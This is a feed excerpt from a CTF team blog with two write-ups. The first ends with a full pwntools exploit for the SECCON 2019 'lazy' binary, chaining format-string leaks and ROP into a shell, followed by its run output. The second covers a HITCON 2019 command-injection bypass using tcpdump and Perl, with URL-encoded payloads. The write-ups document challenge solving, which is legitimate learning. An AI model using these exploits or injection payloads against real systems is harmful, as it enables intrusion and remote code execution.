class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">host, port = <span class="string">"lazy.chal.seccon.jp"</span>, <span class="string">"33333"</span></span><br><span class="line">filename = <span class="string">"./lazy"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp, pie=True, source=False, pscript=<span class="string">""</span>)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        <span class="keyword">if</span> source:</span><br><span class="line">            script += <span class="string">"b %s\n"</span>%(x)</span><br><span class="line">        <span class="keyword">elif</span> pie:</span><br><span class="line">            script += <span class="string">"b *%x\n"</span>%(PIE+x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script += <span class="string">"b *0x%x\n"</span> % x</span><br><span class="line">    script += pscript</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'3: Exit\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'username : '</span>, username)</span><br><span class="line">    r.sendlineafter(<span class="string">'password : '</span>, password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadLazy</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, <span class="string">'lazy'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Sending 14216 bytes'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'lazy'</span>, <span class="string">'w+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.recvall(timeout=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaks from the stack</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakFMTSi</span><span class="params">(i)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, <span class="string">'%&#123;&#125;$lx   '</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaks from an address</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakFMTSaddr</span><span class="params">(addr)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    s = <span class="string">'%7$s    '</span></span><br><span class="line">    s += p64(addr)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow</span><span class="params">()</span>:</span></span><br><span class="line">    file = <span class="string">'libc'</span></span><br><span class="line">    padding = file+<span class="string">'\x00'</span>*(<span class="number">0x18</span>-len(file))</span><br><span class="line">    POPRDI = <span class="number">0x00000000004015f3</span></span><br><span class="line">    POPRBP = <span class="number">0x0000000000400c70</span></span><br><span class="line">    POPRSIR15 = <span class="number">0x00000000004015f1</span></span><br><span class="line">    POPRSPR13R14R15 = <span class="number">0x00000000004015ed</span></span><br><span class="line">    LIBC_SO_6 = <span class="number">0x400689</span></span><br><span class="line">    PLACETOPIVOT = <span class="number">0x602050</span></span><br><span class="line">    </span><br><span class="line">    ropchain = p64(POPRSIR15)</span><br><span class="line">    ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">    ropchain += p64(LIBC_SO_6)</span><br><span class="line">    ropchain += p64(POPRDI)</span><br><span class="line">    ropchain += p64(LIBC_SO_6)</span><br><span class="line">    ropchain += p64(elf.plt[<span class="string">'open'</span>]) <span class="comment"># open("libc.so.6", 0)</span></span><br><span class="line"></span><br><span class="line">    ropchain += p64(POPRBP)</span><br><span class="line">    ropchain += p64(STACKADDR+<span class="number">0xc0</span>) <span class="comment"># RBP = STACKADDR+0x90+0x30</span></span><br><span class="line"></span><br><span class="line">    ropchain += p64(POPRDI)</span><br><span class="line">    ropchain += p64(<span class="number">0x401788</span>)</span><br><span class="line">    ropchain += p64(elf.plt[<span class="string">'atoi'</span>]) <span class="comment"># atoi(0x401788) which will do RDX = 0xa</span></span><br><span class="line"></span><br><span class="line">    ropchain += p64(POPRSIR15)</span><br><span class="line">    ropchain += p64(STACKADDR+<span class="number">0xc0</span><span class="number">-0xdc</span>)</span><br><span class="line">    ropchain += p64(<span class="number">0x3</span>)</span><br><span class="line">    ropchain += p64(POPRDI)</span><br><span class="line">    ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">    ropchain += p64(elf.plt[<span class="string">'read'</span>]) <span class="comment"># read(0, STACKADDR+0x90+0x30-0xdc, 0xa)</span></span><br><span class="line"></span><br><span class="line">    ropchain += p64(POPRSIR15)</span><br><span class="line">    ropchain += p64(STACKADDR)</span><br><span class="line">    ropchain += p64(<span class="number">0x3</span>)    </span><br><span class="line">    ropchain += p64(POPRDI)</span><br><span class="line">    ropchain += p64(<span class="number">0x3</span>)</span><br><span class="line">    ropchain += p64(<span class="number">0x400f4c</span>) <span class="comment"># fstat(fd=0x3, STACKADDR)</span></span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, padding+p64(CANARY)+<span class="string">'A'</span>*<span class="number">8</span>+ropchain)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    padding = <span class="string">'libc'</span>+<span class="string">'\x00'</span>*<span class="number">0x14</span></span><br><span class="line">    POPRDI = <span class="number">0x00000000004015f3</span></span><br><span class="line">    ropchain = p64(POPRDI)</span><br><span class="line">    ropchain += p64(BINSH)</span><br><span class="line">    ropchain += p64(SYSTEM)</span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendline(padding+p64(CANARY)+<span class="string">'A'</span>*<span class="number">8</span>+ropchain)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">    r = getConn()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        <span class="comment">#debug(["login_source.c:49","login_source.c:32"], pie=False, source=True)</span></span><br><span class="line">        debug([<span class="number">0x40146c</span>,<span class="number">0x00000000004015f3</span>], pie=<span class="keyword">False</span>) <span class="comment"># chdir 0x4013da read 0x400d33</span></span><br><span class="line">    login(<span class="string">"_H4CK3R_"</span>, <span class="string">"3XPL01717"</span>)</span><br><span class="line">    <span class="comment">#downloadLazy()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    leakFMTSaddr(elf.got[<span class="string">'puts'</span>]) <span class="comment"># canary</span></span><br><span class="line">    r.recv(<span class="number">0xb</span>)</span><br><span class="line">    PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    LIBC = PUTS<span class="number">-0x67880</span></span><br><span class="line">    SYSTEM = LIBC+<span class="number">0x3f570</span></span><br><span class="line">    BINSH = LIBC+<span class="number">0x163c38</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"PUTS 0x%x"</span>%PUTS)</span><br><span class="line">    log.info(<span class="string">"LIBC 0x%x"</span>%LIBC)</span><br><span class="line">    log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">    log.info(<span class="string">"BINSH 0x%x"</span>%BINSH)</span><br><span class="line">    <span class="keyword">print</span> r.recvuntil(<span class="string">'OK! Downloading...\n'</span>)</span><br><span class="line">    </span><br><span class="line">    leakFMTSi(<span class="number">9</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Filename : '</span>)</span><br><span class="line">    CANARY = int(r.recv(<span class="number">0x10</span>),<span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">"CANARY 0x%x"</span>%CANARY)</span><br><span class="line">    leakFMTSi(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Filename : '</span>)</span><br><span class="line">    STACKADDR = int(r.recv(<span class="number">0x10</span>),<span class="number">16</span>)</span><br><span class="line">    STACKADDR += <span class="number">0x900</span> <span class="comment"># prevent a stupid printf error</span></span><br><span class="line">    log.info(<span class="string">"STACKADDR 0x%x"</span>%STACKADDR)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(<span class="string">"libc.so.6"</span>):</span><br><span class="line">        exploit()</span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        overflow()</span><br><span class="line">        r.sendline(p64(<span class="number">0x03</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">' bytes'</span>)</span><br><span class="line">        a = r.recvall()</span><br><span class="line">        <span class="comment">#print len(a)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'2: Login'</span> <span class="keyword">in</span> a <span class="keyword">or</span> len(a) == <span class="number">0</span>:</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'libc.so.6'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(a)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>Running it </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ python lazy.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/lazy/lazy'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done</span><br><span class="line">[*] PUTS 0x7f52ab072880</span><br><span class="line">[*] LIBC 0x7f52ab00b000</span><br><span class="line">[*] LIBC 0x7f52ab04a570</span><br><span class="line">[*] LIBC 0x7f52ab16ec38</span><br><span class="line">    0\x1f`OK! Downloading...</span><br><span class="line"></span><br><span class="line">[*] CANARY 0x76eb2783e56af300</span><br><span class="line">[*] STACKADDR 0x7ffead1298c0</span><br><span class="line">[+] Receiving all data: Done (3.49MB)</span><br><span class="line">[*] Closed connection to lazy.chal.seccon.jp port 33333</span><br><span class="line">[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done</span><br><span class="line">[*] PUTS 0x7fb92abf5880</span><br><span class="line">[*] LIBC 0x7fb92ab8e000</span><br><span class="line">[*] LIBC 0x7fb92abcd570</span><br><span class="line">[*] LIBC 0x7fb92acf1c38</span><br><span class="line">    0\x1f`OK! Downloading...</span><br><span class="line"></span><br><span class="line">[*] CANARY 0x2af46916b0743600</span><br><span class="line">[*] STACKADDR 0x7fff8cfe3ed0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Welcome to private directory</span><br><span class="line">You can download contents <span class="keyword">in</span> this directory, but you can<span class="string">'t download contents with a dot in the name</span></span><br><span class="line"><span class="string">lazy</span></span><br><span class="line"><span class="string">libc.so.6</span></span><br><span class="line"><span class="string">Input file name</span></span><br><span class="line"><span class="string">Filename : libcOK! Downloading...</span></span><br><span class="line"><span class="string">./lib</span></span><br><span class="line"><span class="string">No such file!</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">810a0afb2c69f8864ee65f0bdca999d7_FLAG</span></span><br><span class="line"><span class="string">cat</span></span><br><span class="line"><span class="string">lazy</span></span><br><span class="line"><span class="string">ld.so</span></span><br><span class="line"><span class="string">libc.so.6</span></span><br><span class="line"><span class="string">q</span></span><br><span class="line"><span class="string">run.sh</span></span><br><span class="line"><span class="string">$ ./cat 810a0afb2c69f8864ee65f0bdca999d7_FLAG</span></span><br><span class="line"><span class="string">SECCON&#123;Keep_Going!_KEEP_GOING!_K33P_G01NG!&#125;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;lazy&lt;/p&gt;
&lt;p&gt;332&lt;/p&gt;
&lt;p&gt;lazy.chal.seccon.jp 33333&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1st-Stage&quot;&gt;&lt;a href=&quot;#1st-Stage&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="seccon2019" scheme="https://teamrocketist.github.io/tags/seccon2019/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Hitcon 2019 - Virtual Public Network</title>
    <link href="https://teamrocketist.github.io/2019/10/14/Web-Hitcon-2019-Virtual-Public-Network/"/>
    <id>https://teamrocketist.github.io/2019/10/14/Web-Hitcon-2019-Virtual-Public-Network/</id>
    <published>2019-10-14T15:18:51.000Z</published>
    <updated>2022-08-23T00:14:55.169Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Virtual Public Network [183pts]</p><p>Vulnerable Point of Your Network :)</p><p><a href="http://13.231.137.9" target="_blank" rel="noopener">http://13.231.137.9</a></p><p>Author: 🍊Orange</p><p>81 Teams solved.</p></blockquote><p>We have have a web interface where we can control <strong>tcpdump command</strong> via options parameter this immediately hints for a command injection challenge, after inspecting the code we could see some hints in a html comment:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'container'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'row justify-content-center'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">style</span>=<span class="string">"font-size: 200%"</span>&gt;</span> Virtual <span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">red</span>&gt;</span>"Public"<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span> Network <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Hint for you :)</span></span><br><span class="line"><span class="comment">     &lt;a href='diag.cgi'&gt;diag.cgi&lt;/a&gt;</span></span><br><span class="line"><span class="comment">     &lt;a href='DSSafe.pm'&gt;DSSafe.pm&lt;/a&gt;  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'row justify-content-center'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Cgi scripts outside cgi-bin folder won’t execute instead we will be able to view its source code so lets inspect <strong>diag.cgi</strong> first:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> lib <span class="string">'/var/www/html/'</span>;</span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI ();</span><br><span class="line"><span class="keyword">use</span> DSSafe;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">tcpdump_options_syntax_check</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $options = <span class="keyword">shift</span>;</span><br><span class="line">    <span class="keyword">return</span> $options <span class="keyword">if</span> <span class="keyword">system</span>(<span class="string">"timeout -s 9 2 /usr/bin/tcpdump -d $options &gt;/dev/null 2&gt;&amp;1"</span>) == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">undef</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">my</span> $options = CGI::param(<span class="string">"options"</span>);</span><br><span class="line"><span class="keyword">my</span> $output = tcpdump_options_syntax_check($options);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># backdoor :)</span></span><br><span class="line"><span class="keyword">my</span> $tpl = CGI::param(<span class="string">"tpl"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">length</span> $tpl &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">index</span>($tpl, <span class="string">".."</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">    $tpl = <span class="string">"./tmp/"</span> . $tpl . <span class="string">".thtml"</span>;</span><br><span class="line">    <span class="keyword">require</span>($tpl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This would be a very easy challenge if it wasn’t for <strong>use DSSafe;</strong> after some search online I ended up at the challenge author <a href="https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html" target="_blank" rel="noopener">blog</a> as he said this is a module to <strong>hook</strong> all dangerous Perl invocations like system, open, backtick etc…</p><p>This module is called it’s source code at <strong><a href="http://13.231.137.9/DSSafe.pm" target="_blank" rel="noopener">http://13.231.137.9/DSSafe.pm</a></strong>:</p><p>The full source code can be found at <a href="https://pastebin.com/EyY7UWAX" target="_blank" rel="noopener">https://pastebin.com/EyY7UWAX</a></p><p>This module replaces the original <strong>system</strong> and implements its own command line parser which blocks some bad characters like:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\&amp;\*\(\)\&#123;\&#125;\[\]\`\;\|\?\n~&lt;&gt;]</span><br></pre></td></tr></table></figure><p>So the idea behind to bypass this restritions is to run perl script via <strong>strerr</strong> by using tcpdump ‘-r’ option, this option tries to read a file and this is what happens when we try to read a file that doesn’t exist with tcpdump:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tcpdump -d -r 123</span><br><span class="line">tcpdump: 123: No such file or directory</span><br></pre></td></tr></table></figure><p>As you can see we can control the file name (123) so we can use the name to inject our perl code, but we have two aditional parts to consider so we don’t get errors while running it this error message.</p><p>The first one is the <strong>tcpdump:</strong> part luckly in perl this will interpreted as a <strong>goto</strong> jump label this is something that you can do also in <strong>c</strong> or on assembly(labels where we can jump to) we won’t have any compilation problems with this so lets move on.</p><p>The second one is <strong>: No such file or directory</strong> this won’t compile unless we remove by using a comment just like we do when we are performing sql injection, so lets test if this works in the command line:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tcpdump -d -r <span class="string">'print 123#'</span> 2&gt;&amp;1 | perl -</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>As you can see it works here is a visual image from orange blog how the perl script looks like in a highlighter:</p><p><img src="https://1.bp.blogspot.com/-2bmmwKH2Er8/XW0DfygFjLI/AAAAAAAAEWc/srwYqeeUj7QSGvd1FmUHMasLezoiTFrUwCLcBGAs/s1600/upload_153c58ab7d99f019e4090a3a600261a0%255B1%255D.png" alt></p><p>We can’t really control stdout in the application so we need to redirect the stderr into a file and use the backdoor present here:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># backdoor :)</span></span><br><span class="line"><span class="keyword">my</span> $tpl = CGI::param(<span class="string">"tpl"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">length</span> $tpl &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">index</span>($tpl, <span class="string">".."</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">    $tpl = <span class="string">"./tmp/"</span> . $tpl . <span class="string">".thtml"</span>;</span><br><span class="line">    <span class="keyword">require</span>($tpl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So if we send our payload to a file at <strong>./tmp</strong> and pass the file name to tpl get parameter, require will execute as perl and we get <strong>RCE</strong>.</p><p>Our final payload will require a <strong>&lt;</strong> in the end to fool <strong>DSSAFE.pm</strong> and redirect <strong>STDERR</strong> into a folder that we can write and read, this folder is <strong>./tmp</strong> :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r$x=<span class="string">"ls /"</span>,<span class="keyword">exec</span>$x<span class="comment"># 2&gt;./tmp/qw.thtml &lt;&amp;tpl=qw</span></span><br></pre></td></tr></table></figure><p>And now url encoding the string:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r<span class="variable">$x</span>=<span class="string">"ls%20/"</span>,<span class="built_in">exec</span><span class="variable">$x</span>%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw</span><br></pre></td></tr></table></figure><p>Adding some backslashes to dolar sign so the variable isn’t evaluated as a bash variable:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r\<span class="variable">$x</span>=<span class="string">"ls%20/"</span>,<span class="built_in">exec</span>\<span class="variable">$x</span>%23%202&gt;./tmp/qw.thtml%20&lt;&amp;tpl=qw</span><br></pre></td></tr></table></figure><p>Using curl to test our payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span 